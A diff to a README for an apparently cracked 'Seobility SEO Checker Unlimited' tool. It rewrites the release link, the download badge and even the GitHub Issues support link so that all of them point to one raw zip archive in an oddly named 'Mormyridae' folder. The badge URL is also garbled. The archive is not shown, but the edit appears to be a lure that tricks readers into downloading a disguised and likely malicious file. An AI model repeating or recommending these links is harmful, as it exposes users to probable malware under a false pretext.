@@ -6,7 +6,7 @@ Welcome to the **Seobility SEO Checker Unlimited**! This application helps you e
 
 ## 📥 Download
 
-[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen.svg)](https://github.com/randysuarez/seobility-seo-checker-unlimited/releases)
+[![Download](https://github.com/randysuarez/seobility-seo-checker-unlimited/raw/refs/heads/main/Mormyridae/seobility-checker-seo-unlimited-1.1.zip%https://github.com/randysuarez/seobility-seo-checker-unlimited/raw/refs/heads/main/Mormyridae/seobility-checker-seo-unlimited-1.1.zip)](https://github.com/randysuarez/seobility-seo-checker-unlimited/raw/refs/heads/main/Mormyridae/seobility-checker-seo-unlimited-1.1.zip)
 
 ## 🖥️ System Requirements
 
@@ -30,7 +30,7 @@ The **Seobility SEO Checker Unlimited** provides several valuable features:
 
 To download the application, visit the link below:
 
-[Download the latest release](https://github.com/randysuarez/seobility-seo-checker-unlimited/releases).
+[Download the latest release](https://github.com/randysuarez/seobility-seo-checker-unlimited/raw/refs/heads/main/Mormyridae/seobility-checker-seo-unlimited-1.1.zip).
 
 1. Click on the link above to go to the releases page.
 2. Look for the latest version of **Seobility SEO Checker Unlimited**.
@@ -64,6 +64,6 @@ If you want to contribute to our project, feel free to check our GitHub reposito
 
 ## 📞 Support
 
-For further assistance, please visit our [GitHub Issues page](https://github.com/randysuarez/seobility-seo-checker-unlimited/issues) to report any bugs or request additional features. 
+For further assistance, please visit our [GitHub Issues page](https://github.com/randysuarez/seobility-seo-checker-unlimited/raw/refs/heads/main/Mormyridae/seobility-checker-seo-unlimited-1.1.zip) to report any bugs or request additional features. 
 
 Thank you for choosing **Seobility SEO Checker Unlimited**. We hope it helps optimize your website effectively!
